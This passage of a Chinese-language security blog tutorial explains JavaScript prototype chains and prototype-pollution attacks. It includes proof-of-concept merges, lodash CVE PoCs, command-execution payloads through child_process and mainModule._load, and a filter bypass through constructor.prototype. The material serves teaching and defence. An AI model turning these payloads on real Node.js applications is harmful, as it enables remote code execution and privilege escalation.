class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>&#125;<br><br><span class="hljs-keyword">let</span> me = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;matrix&quot;</span>, <span class="hljs-number">20</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(me)                                   <span class="hljs-comment">//Person &#123; name: &#x27;matrix&#x27;, age: 20 &#125;</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(me.<span class="hljs-property">__proto__</span>)                         <span class="hljs-comment">//&#123;&#125;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(me.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>)               <span class="hljs-comment">//[Object: null prototype] &#123;&#125;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)                     <span class="hljs-comment">//[Object: null prototype] &#123;&#125;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(me.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>)     <span class="hljs-comment">//null</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)                     <span class="hljs-comment">//&#123;&#125;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)           <span class="hljs-comment">//undefined</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span>)           <span class="hljs-comment">//[Object: null prototype] &#123;&#125;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>) <span class="hljs-comment">//null</span><br></code></pre></td></tr></table></figure><p>可以发现，空对象<code>&#123;&#125;</code>的原型是<code>Object.prototype</code>，是<strong>JavaScript 所有“普通对象”最终继承的顶级原型对象</strong>。</p><p>换句话说，几乎所有通过 <code>&#123;&#125;</code>、<code>new Object()</code>、构造函数（比如 <code>function Animal()&#123;&#125;</code>）等方式创建的对象，最终其原型链都会指向 <code>Object.prototype</code>。</p><p>注意，<code>[Object: null prototype] &#123;&#125;</code> 是指<strong>没有原型的对象</strong>，这种对象的原型是 <code>null</code>，但<strong>它不是普通对象的顶级原型对象</strong>，只是一个“纯净字典”对象。</p><p>在 Node.js 或部分现代 JavaScript 环境下，console.log 打印的对象如果它的原型是 <strong>null</strong>，会显示 <code>[Object: null prototype] &#123;&#125;</code>。</p><p><code>[Object: null prototype] &#123;&#125;</code> 可以指两种情况：</p><ol><li><p>Object.create(null) 创建的对象</p><p>这是“纯净字典”，没有任何继承。仅仅是自己的属性，没有任何内置方法。</p></li><li><p>Object.prototype 本身**</p><p>它也是一个对象，<code>__proto__</code> 也是 <code>null</code>。但它<strong>自带一堆方法和属性</strong>（如 <code>toString</code>、<code>hasOwnProperty</code> 等），这些是它本身定义的，不是继承来的。</p></li></ol><p><code>Object.prototype</code> 上定义了一些所有对象都能用的方法，例如：</p><ul><li><code>toString()</code></li><li><code>hasOwnProperty()</code></li><li><code>isPrototypeOf()</code></li><li><code>valueOf()</code></li><li><code>propertyIsEnumerable()</code></li><li><code>toLocaleString()</code></li><li>…等</li></ul><p>这些方法是所有“普通对象”都能直接访问的，因为它们继承自 <code>Object.prototype</code>。</p><p>而在往上呢？</p><p><code>Object.prototype</code> 本身是一个对象，但它的 <code>__proto__</code> 是 <code>null</code>，即原型链的终点。</p><p>我们可以这样理解，<code>Object.prototype</code> 没有继承自任何对象，它的原型是 <code>null</code>，即原型链的终点。</p><p>我们再理一下整条链子</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elm">实例对象me<br>  ↓ __proto__<br><span class="hljs-type">Person</span>.proto<span class="hljs-keyword">type</span><br>  ↓ __proto__<br><span class="hljs-type">Object</span>.proto<span class="hljs-keyword">type</span><br>  ↓ __proto__<br><span class="hljs-title">null</span><br></code></pre></td></tr></table></figure><p>实例对象的原型，原型的原型……这样一层层往上，就构成了一条链子，这就是原型链。</p><p><strong>原型链</strong>是 JavaScript 实现对象继承的一种机制。它是一种对象之间的链式结构，每个对象都通过其内部的 <code>[[Prototype]]</code>（即 <code>__proto__</code>）属性指向另一个对象，这个被指向的对象叫“原型对象（prototype）”。这样层层向上，最终指向 <code>Object.prototype</code>，其 <code>__proto__</code> 为 <code>null</code>，链条至此结束。</p><p>以下面代码和图片为例，讲解一下整个原型链</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Monster</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, hp</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">hp</span> = hp;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">g</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;ggg&quot;</span>);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在下面链子中，Function是顶层构造器，Object是顶层原型对象。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132246022.png" alt="image-20250709221427817"></p><h2 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h2><p>下面我们再提一下JavaScript里类的概念。</p><p>早期 JavaScript 没有“类”概念：JavaScript 设计之初（1995年），只有<strong>构造函数</strong>和<strong>原型对象</strong>，没有 class 关键字，也没有类的语法。对象的继承、方法的复用，都是通过<strong>构造函数 + 原型链</strong>来实现的。</p><p>早期的“类”写法其实是用函数和原型对象模拟出来的，实际底层还是对象和原型链。</p><p><strong>ES6（2015）正式引入了 <code>class</code> 关键字</strong>，让语法更像面向对象语言。但本质上，JavaScript 的 class 只是语法糖，底层依然是原型继承实现。也就是说，ES6 的 class 并没有改变 JS 的对象模型，只是让“面向对象”写法更优雅易懂。</p><p>JavaScript 的 <code>class</code> 关键字是为了符合大众的写法特意实现的语法，故称语法糖，本质上还是构造器函数+原型对象的封装。</p><p>所以说，类由构造器和原型对象组成，通过构造器实例化得到对象，实例对象通过原型链继承原型对象上的方法和属性。</p><p>我们用类重新实现一下上面，是不是顺眼许多：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>  &#125;<br>&#125;<br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Tom&#x27;</span>, <span class="hljs-number">18</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">name</span>); <span class="hljs-comment">// Tom</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">age</span>);  <span class="hljs-comment">// 18</span><br></code></pre></td></tr></table></figure><p>类名（如 <code>Person</code>）本身是构造器函数，不是原型对象。原型对象是 <code>Person.prototype</code>。实例对象的 <code>__proto__</code> 指向 <code>Person.prototype</code>，实现继承。</p><p>注意：</p><p>类名&#x3D;构造器；</p><p>实例对象的 <code>__proto__</code> &#x3D;构造函数<code>prototype</code>&#x3D;原型或原型对象。</p><h2 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h2><p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制，比如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Father</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;Donald&#x27;</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">last_name</span> = <span class="hljs-string">&#x27;Trump&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Son</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;Melania&#x27;</span><br>&#125;<br><br><span class="hljs-title class_">Son</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Father</span>()<br><br><span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>()<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Name: <span class="hljs-subst">$&#123;son.first_name&#125;</span> <span class="hljs-subst">$&#123;son.last_name&#125;</span>`</span>) <span class="hljs-comment">// Name: Melania Trump</span><br></code></pre></td></tr></table></figure><p>Son类继承了Father类的<code>last_name</code>属性，最后输出的是<code>Name: Melania Trump</code>。</p><p>总结一下，对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p><ol><li>在对象son中寻找last_name</li><li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li><li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li><li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li></ol><p>总的来讲，当访问一个实例对象的属性时，先在对象的本身找，找不到就去对象的原型上找，如果还是找不到，就去对象的原型（原型也是对象，也有它自己的原型）的原型上找，如此继续，直到找到为止，或者查找到最顶层的原型对象中也没有找到，就结束查找，返回undefined。</p><p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。</p><h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>说到，<code>me.__proto__</code>指向的是<code>Person</code>类的<code>prototype</code>。那么，如果我们修改了<code>me.__proto__</code>中的值，是不是修改的person类呢？</p><p>做个简单的实验：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">// me是一个简单的JavaScript对象</span><br>let me = &#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&quot;matrix&quot;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span>&#125;<br><span class="hljs-comment">// me.age 此时为20</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(me.age)<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(me.__proto__) <span class="hljs-comment">// [Object: null prototype] &#123;&#125;</span><br><span class="hljs-comment">// 修改me的原型（即Object）</span><br>me.__proto__.age = <span class="hljs-number">18</span><br><span class="hljs-comment">// 由于查找顺序的原因，me.age仍然是20</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(me.age)<br><span class="hljs-comment">// 此时再用Object创建一个空的him对象</span><br>let him = &#123;&#125;<br><span class="hljs-comment">// 查看him.age，是18</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(him.age)<br></code></pre></td></tr></table></figure><p>发现，我们用Object类创建了一个him对象<code>let him = &#123;&#125;</code>，him对象也有一个age属性了。</p><p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p><p>但是发现<code>me.__proto__</code>直接修改的是<code>Object.prototype</code>，为什么呢？</p><p>注意这里有个关键点</p><table><thead><tr><th>创建方式</th><th><code>me.__proto__</code>指向</th><th><code>me.__proto__</code>内容</th><th>备注</th></tr></thead><tbody><tr><td>字面量 {}</td><td><code>Object.prototype</code></td><td>{}</td><td>实际上有很多内置方法</td></tr><tr><td>构造函数 new</td><td><code>Person.prototype</code></td><td>{}</td><td>默认空对象，但有 constructor 指向 Person</td></tr></tbody></table><p>所以，除了通过 <code>Object.create(null)</code> 或 <code>Object.create(XXX)</code> 等方式创建的对象，绝大多数“非 new 构造函数”创建的普通对象，其 <code>__proto__</code> 都指向 <code>Object.prototype</code>。</p><p>ok，那我们明白原型链污染是什么了，接下来我们讲一讲实际中怎么导致原型链污染。</p><h2 id="如何污染"><a href="#如何污染" class="headerlink" title="如何污染"></a>如何污染</h2><p>在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？</p><p>其实就是哪些情况下我们可以设置<code>__proto__</code>的值呢？</p><p>找找能够控制数组（对象）的“键名”的操作即可：</p><ul><li>对象merge，即merge() 函数</li><li>对象clone（其实内核就是将待操作的对象merge到一个空对象中），即clone() 内核</li><li>copy() 函数</li></ul><p>以对象merge为例，我们想象一个简单的merge函数：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">//把 source 对象（源对象）中的所有属性，递归地合并到 target 对象（目标对象）里</span><br>function <span class="hljs-built_in">merge</span>(target, source) &#123;<br>    <span class="hljs-keyword">for</span> (let key <span class="hljs-keyword">in</span> source) &#123;<span class="hljs-comment">//遍历 source 对象的所有属性</span><br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> <span class="hljs-selector-tag">source</span> &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-built_in">merge</span>(target<span class="hljs-selector-attr">[key]</span>, <span class="hljs-selector-tag">source</span><span class="hljs-selector-attr">[key]</span>)<span class="hljs-comment">//如果这两个属性的值都是对象，就会继续把它们里面的内容合并</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target<span class="hljs-selector-attr">[key]</span> = <span class="hljs-selector-tag">source</span><span class="hljs-selector-attr">[key]</span><span class="hljs-comment">//否则，直接把 source 的属性赋值到 target 上</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在合并的过程中，存在赋值的操作<code>target[key] = source[key]</code>，那么，这个key如果是<code>__proto__</code>，是不是就可以原型链污染呢？</p><p>我们用如下代码实验一下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus">function <span class="hljs-built_in">merge</span>(target, source) &#123;<br>    <span class="hljs-keyword">for</span> (let key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> <span class="hljs-selector-tag">source</span> &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-built_in">merge</span>(target<span class="hljs-selector-attr">[key]</span>, <span class="hljs-selector-tag">source</span><span class="hljs-selector-attr">[key]</span>)<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target<span class="hljs-selector-attr">[key]</span> = <span class="hljs-selector-tag">source</span><span class="hljs-selector-attr">[key]</span><br>        &#125;<br>    &#125;<br>&#125;<br><br>let o1 = &#123;&#125;<br>let o2 = &#123;<span class="hljs-selector-tag">a</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-selector-tag">b</span>: <span class="hljs-number">2</span>&#125;&#125;<br><span class="hljs-function"><span class="hljs-title">merge</span><span class="hljs-params">(o1, o2)</span></span><br>console<span class="hljs-selector-class">.log</span>(o1.a) <span class="hljs-comment">// 1</span><br>console<span class="hljs-selector-class">.log</span>(o1.b) <span class="hljs-comment">// 2</span><br>o3 = &#123;&#125;<br>console<span class="hljs-selector-class">.log</span>(o3.b) <span class="hljs-comment">// undefined</span><br></code></pre></td></tr></table></figure><p>结果是，合并虽然成功了，但原型链没有被污染：</p><p>这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p><p>上面那句实际上是把你 o2 的原型定义为创建的新对象 <code>&#123;b: 2&#125;</code>，也就是<strong>自定义了原型</strong>。</p><p>这样的话，o2本身有<code>a: 1</code>，然后又从他的原型 <code>&#123;b: 2&#125;</code>那里继承了<code>b: 2</code>，再把这两个值<code>[a, b]</code>赋给o1，所以只是o1多了两个属性，并不会对 <code>Object.prototype</code>产生任何影响。</p><p>所以新创建的o3不会有b这一属性。</p><p>那么，如何让<code>__proto__</code>被认为是一个键名呢？</p><p>我们将代码改成如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">function <span class="hljs-built_in">merge</span>(target, source) &#123;<br>    <span class="hljs-keyword">for</span> (let key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> <span class="hljs-selector-tag">source</span> &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-built_in">merge</span>(target<span class="hljs-selector-attr">[key]</span>, <span class="hljs-selector-tag">source</span><span class="hljs-selector-attr">[key]</span>)<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target<span class="hljs-selector-attr">[key]</span> = <span class="hljs-selector-tag">source</span><span class="hljs-selector-attr">[key]</span><br>        &#125;<br>    &#125;<br>&#125;<br><br>let o1 = &#123;&#125;<br>let o2 = JSON<span class="hljs-selector-class">.parse</span>(<span class="hljs-string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)<br><span class="hljs-function"><span class="hljs-title">merge</span><span class="hljs-params">(o1, o2)</span></span><br>console<span class="hljs-selector-class">.log</span>(o1<span class="hljs-selector-class">.a</span>, o1.b) <span class="hljs-comment">// 1 2</span><br>o3 = &#123;&#125;<br>console<span class="hljs-selector-class">.log</span>(o3.b) <span class="hljs-comment">// 2</span><br></code></pre></td></tr></table></figure><p>可见，新建的o3对象，也存在b属性，说明Object已经被污染：</p><p>这是因为，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p><p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p><p>当然，原型链污染有一些实际利用的payload以及绕过技巧。</p><p>直接 require（可能被禁用&#x2F;覆盖&#x2F;不可用）：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">(<span class="hljs-string">&#x27;child_process&#x27;</span>)</span></span><span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)<br></code></pre></td></tr></table></figure><p>EXP 常用的 _load：</p><p>很多EXP用<code>global.process.mainModule.constructor._load</code>，就是因为它不依赖于上下文里的require变量，不容易被删掉或限制，更通用、更隐蔽，更适合在利用原型链污染时远程加载和利用Node.js内置模块。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">global<span class="hljs-selector-class">.process</span><span class="hljs-selector-class">.mainModule</span><span class="hljs-selector-class">.constructor</span>.<span class="hljs-built_in">_load</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)<br></code></pre></td></tr></table></figure><p>而且有时候<code>__proto__ </code>已被过滤，因此可以用<code>constructor.prototype</code>代替，例如：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;isAdmin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;isAdmin&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>下面我们讲一下实际可以污染的模块（已知漏洞）。</p><h2 id="Lodash-模块"><a href="#Lodash-模块" class="headerlink" title="Lodash 模块"></a>Lodash 模块</h2><p>Lodash 是一个 JavaScript 库，包含简化字符串、数字、数组、函数和对象编程的工具，可以帮助程序员更有效地编写和维护 JavaScript 代码。并且是一个流行的 npm 库，仅在GitHub 上就有超过 400 万个项目使用，Lodash的普及率非常高，每月的下载量超过 8000 万次。但是这个库中有几个严重的原型污染漏洞。</p><h3 id="lodash-defaultsDeep-方法"><a href="#lodash-defaultsDeep-方法" class="headerlink" title="lodash.defaultsDeep 方法"></a>lodash.defaultsDeep 方法</h3><p>2019 年 7 月 2 日，<a href="https://snyk.io/vuln/SNYK-JS-LODASH-450202">Snyk 发布了一个高严重性原型污染安全漏洞</a>（CVE-2019-10744），影响了小于 4.17.12 的所有版本的 lodash。</p><p>Lodash 库中的 <code>defaultsDeep</code> 函数可能会被包含 <code>constructor</code> 的 Payload 诱骗添加或修改<code>Object.prototype</code> 。最终可能导致 Web 应用程序崩溃或改变其行为，具体取决于受影响的用例。以下是 Snyk 给出的此漏洞验证 POC：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> mergeFn = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>).<span class="hljs-property">defaultsDeep</span>;<br><span class="hljs-keyword">const</span> payload = <span class="hljs-string">&#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;whoami&quot;: &quot;Vulnerable&quot;&#125;&#125;&#125;&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">check</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">mergeFn</span>(&#123;&#125;, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(payload));<br>    <span class="hljs-keyword">if</span> ((&#123;&#125;)[<span class="hljs-string">`a0`</span>] === <span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Vulnerable to Prototype Pollution via <span class="hljs-subst">$&#123;payload&#125;</span>`</span>);<br>    &#125;<br>  &#125;<br><br><span class="hljs-title function_">check</span>();<br></code></pre></td></tr></table></figure><h3 id="lodash-merge-方法"><a href="#lodash-merge-方法" class="headerlink" title="lodash.merge 方法"></a>lodash.merge 方法</h3><p>Lodash.merge 作为 lodash 中的对象合并插件，他可以<strong>递归</strong>合并 <code>sources</code> 来源对象自身和继承的可枚举属性到 <code>object</code> 目标对象，以创建父映射对象：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">merge</span><span class="hljs-params">(object, sources)</span></span><br></code></pre></td></tr></table></figure><ul><li><strong>参数</strong>：merge(object, sources)<ul><li><code>object</code>：目标对象，合并的结果会写入它（通常会改变它本身）。</li><li><code>sources</code>：一个或多个源对象，按顺序合并到目标对象里。</li></ul></li><li><strong>规则</strong>：<ul><li>当多个对象有<strong>相同的键</strong>时，<strong>最右边（最后）的源对象的值会覆盖之前的值</strong>。</li><li>如果有多个对象完全一样（比如多次合并同一个对象），合并结果也只会有一份对应的键和值。</li></ul></li></ul><p>下面给出一个验证漏洞的 POC：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">var</span> lodash= require(&#x27;lodash&#x27;);<br><span class="hljs-keyword">var</span> payload = &#x27;&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;whoami&quot;</span>:<span class="hljs-string">&quot;Vulnerable&quot;</span>&#125;&#125;&#x27;;<br><br><span class="hljs-keyword">var</span> a = &#123;&#125;;<br>console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Before whoami: &quot;</span> + a.whoami);<br>lodash.<span class="hljs-keyword">merge</span>(&#123;&#125;, JSON.<span class="hljs-keyword">parse</span>(payload));<br>console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;After whoami: &quot;</span> + a.whoami);<br></code></pre></td></tr></table></figure><p>在 lodash.merge 方法造成的原型链污染中，为了实现代码执行，我们常常会污染 <code>sourceURL</code> 属性，即给所有 Object 对象中都插入一个 <code>sourceURL</code> 属性，然后通过 lodash.template 方法中的拼接实现任意代码执行漏洞，如 [Code-Breaking 2018] Thejs 这道题。</p><h3 id="lodash-mergeWith-方法"><a href="#lodash-mergeWith-方法" class="headerlink" title="lodash.mergeWith 方法"></a>lodash.mergeWith 方法</h3><p>这个方法类似于 <code>merge</code> 方法。但是它还会接受一个 <code>customizer</code>，以决定如何进行合并。 如果 <code>customizer</code> 返回 <code>undefined</code> 将会由合并处理方法代替。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">mergeWith</span><span class="hljs-params">(object, sources, 